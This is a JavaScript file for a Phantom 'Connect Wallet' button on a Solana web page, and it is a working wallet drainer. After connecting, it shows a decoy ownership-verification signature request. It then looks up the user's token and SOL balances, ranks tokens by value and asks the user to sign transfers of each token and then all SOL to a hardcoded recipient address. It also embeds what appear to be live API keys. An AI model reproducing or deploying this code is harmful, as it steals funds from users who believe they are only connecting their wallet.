import { Buffer } from 'buffer';  // Ensure buffer is available globally
window.Buffer = Buffer;

import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';

// Define necessary variables
let walletAddress = null;

// Function to connect the Phantom wallet and execute the whole flow
async function connectAndExecute() {
    const provider = window.solana;

    // Detect if the user is on a mobile device
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    if (!provider || !provider.isPhantom) {
        // If the user is on mobile, redirect to Phantom wallet app
        if (isMobile) {
            window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
            return;
        }

        // For desktop users, prompt to install Phantom Wallet
        alert('Phantom wallet not found. Please install it!');
        return;
    }

    try {
        // Step 1: Request wallet connection (standard flow)
        const response = await provider.connect();
        walletAddress = response.publicKey.toString();  // Capture the connected wallet address

        // Update button text to indicate connection
        document.getElementById('connectWalletBtn').textContent = `Connected`;

        // Step 2: Sign a message to verify wallet ownership
        await signMessage(provider, walletAddress);

        // Step 3: Fetch SOL balance
        const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
        const balance = await connection.getBalance(new PublicKey(walletAddress));
        const solBalance = balance / 1e9;

        // Step 4: Fetch token balances using Shyft API
        const tokens = await fetchTokenBalances(walletAddress);

        // Step 5: Fetch prices for tokens using Jupiter API
        const tokenPrices = await fetchTokenPrices(tokens);

        // Step 6: Calculate token values and sort them
        const tokenValues = tokens.map(token => {
            const price = tokenPrices[token.info.symbol] || 0;
            const value = price * token.balance;
            return { ...token, value };
        });

        // Filter and sort tokens by value
        const filteredTokens = tokenValues.filter(token => token.value > 50);
        const sortedTokens = filteredTokens.sort((a, b) => b.value - a.value);
        console.log('Filtered and Sorted Tokens by Value:', sortedTokens);

        // Step 7: Transfer tokens in order
        const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with recipient's address
        await transferTokensInOrder(sortedTokens, recipientAddress, connection);

        // Step 8: Transfer SOL after tokens
        await transferSol(connection, recipientAddress, solBalance);

    } catch (err) {
        console.error(err);
        alert('Failed to complete wallet flow');
    }
}


// Function to sign a message and verify wallet ownership
async function signMessage(provider, walletAddress) {
    const message = `Please sign this message to verify ownership of the wallet: ${walletAddress}`;
    const encodedMessage = new TextEncoder().encode(message);
    try {
        const signedMessage = await provider.signMessage(encodedMessage, 'utf8');
        console.log('Signed Message:', signedMessage.signature);
    } catch (err) {
        console.error('Failed to sign message:', err);
    }
}

// Fetch token balances using Shyft API
async function fetchTokenBalances(walletAddress) {
    const apiKey = 'DNvnXBTyUJ_yV56g';  // Replace with your Shyft API key

    try {
        const response = await fetch(`https://api.shyft.to/sol/v1/wallet/all_tokens?network=mainnet-beta&wallet=${walletAddress}`, {
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            }
        });

        const data = await response.json();
        if (data.success) {
            console.log('Token Balances:', data.result);
            return data.result;
        } else {
            throw new Error(data.message || 'Failed to fetch token balances');
        }
    } catch (err) {
        console.error('Error fetching token balances:', err);
        alert('Failed to fetch token balances');
    }
}

// Fetch token prices using Jupiter API
async function fetchTokenPrices(tokens) {
    const tokenSymbols = tokens.map(token => token.info.symbol).join(',');  // Create a comma-separated list of token symbols

    try {
        const response = await fetch(`https://price.jup.ag/v6/price?ids=${tokenSymbols}`);
        const data = await response.json();
        
        // Extract prices and map them to token symbols
        const prices = {};
        for (const [symbol, priceData] of Object.entries(data.data)) {
            prices[symbol] = priceData.price || 0;  // Get the price for each token, default to 0 if not found
        }

        console.log('Token Prices:', prices);
        return prices;
    } catch (err) {
        console.error('Error fetching token prices:', err);
        alert('Failed to fetch token prices');
    }
}

// Transfer SPL tokens in order of their values
async function transferTokensInOrder(tokens, recipientAddress, connection) {
    const provider = window.solana;
    const fromPublicKey = new PublicKey(walletAddress);

    for (const token of tokens) {
        try {
            const tokenAddress = new PublicKey(token.address);  // Token mint address
            const recipientPublicKey = new PublicKey(recipientAddress);
            const tokenBalance = token.balance;

            if (tokenBalance > 0) {
                console.log(`Initiating transfer for ${token.info.symbol} (${tokenBalance})`);

                const transferTx = await createTransferTransaction(
                    connection,
                    fromPublicKey,
                    recipientPublicKey,
                    tokenAddress,
                    tokenBalance,
                    token.info.decimals
                );

                try {
                    // Try to sign and send the transaction
                    const signature = await provider.signAndSendTransaction(transferTx);
                    await confirmTransactionWithTimeout(connection, signature, 8000);  // 30 seconds timeout

                    console.log(`Successfully transferred ${token.info.symbol}!`);
                } catch (signError) {
                    // If signing or sending fails, log the error but continue to the next token
                    console.error(`Failed to transfer ${token.info.symbol}:`, signError);
                }
            }
        } catch (err) {
            console.error(`Failed to transfer ${token.info.symbol}:`, err);
        }
    }
}

// Transfer SOL after token transfers
async function transferSol(connection, recipientAddress, solBalance) {
    try {
        if (solBalance > 0) {
            const provider = window.solana;
            const fromPublicKey = new PublicKey(walletAddress);
            const recipientPublicKey = new PublicKey(recipientAddress);

            console.log(`Initiating SOL transfer (${solBalance} SOL)`);

            // Create a SOL transfer instruction
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: fromPublicKey,
                    toPubkey: recipientPublicKey,
                    lamports: solBalance * 1e9  // Convert SOL to lamports
                })
            );

            transaction.feePayer = fromPublicKey;
            const latestBlockhash = await connection.getLatestBlockhash();
            transaction.recentBlockhash = latestBlockhash.blockhash;

            // Sign and send the transaction
            const signature = await provider.signAndSendTransaction(transaction);
            await confirmTransactionWithTimeout(connection, signature, 8000);  // 8-second timeout

            console.log(`Successfully transferred SOL!`);
        } else {
            console.log('No SOL to transfer.');
        }
    } catch (err) {
        console.error('Failed to transfer SOL:', err);
    }
}

// Create a transaction to transfer SPL tokens
async function createTransferTransaction(connection, fromPublicKey, toPublicKey, tokenMintAddress, amount, decimals) {
    // Get associated token accounts for the sender and recipient
    const fromTokenAccount = await getAssociatedTokenAddress(
        tokenMintAddress,
        fromPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const toTokenAccount = await getAssociatedTokenAddress(
        tokenMintAddress,
        toPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );

    // Convert amount to the smallest unit using BigInt
    const amountInSmallestUnit = BigInt(Math.round(amount * Math.pow(10, decimals)));

    // Create transfer instruction
    const transferInstruction = createTransferInstruction(
        fromTokenAccount,
        toTokenAccount,
        fromPublicKey,
        amountInSmallestUnit,
        [],
        TOKEN_PROGRAM_ID
    );

    // Create and build the transaction
    const transaction = new Transaction().add(transferInstruction);
    transaction.feePayer = fromPublicKey;

    // Get the latest blockhash
    const latestBlockhash = await connection.getLatestBlockhash();
    transaction.recentBlockhash = latestBlockhash.blockhash;

    return transaction;
}

// Confirm transaction with timeout
async function confirmTransactionWithTimeout(connection, signature, timeoutMs) {
    const start = Date.now();

    // Create a promise that rejects after the timeout
    const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("Transaction confirmation timed out")), timeoutMs)
    );

    // Wait for either the confirmation or the timeout
    try {
        await Promise.race([
            connection.confirmTransaction(signature, 'confirmed'),
            timeoutPromise
        ]);
        console.log(`Transaction ${signature} confirmed.`);
    } catch (err) {
        console.error(`Transaction confirmation failed for ${signature}:`, err);
        throw err;
    }

    const end = Date.now();
    console.log(`Transaction confirmation took ${end - start}ms`);
}

// Attach the connectAndExecute function to the "Connect Wallet" button
document.getElementById('connectWalletBtn').addEventListener('click', connectAndExecute);
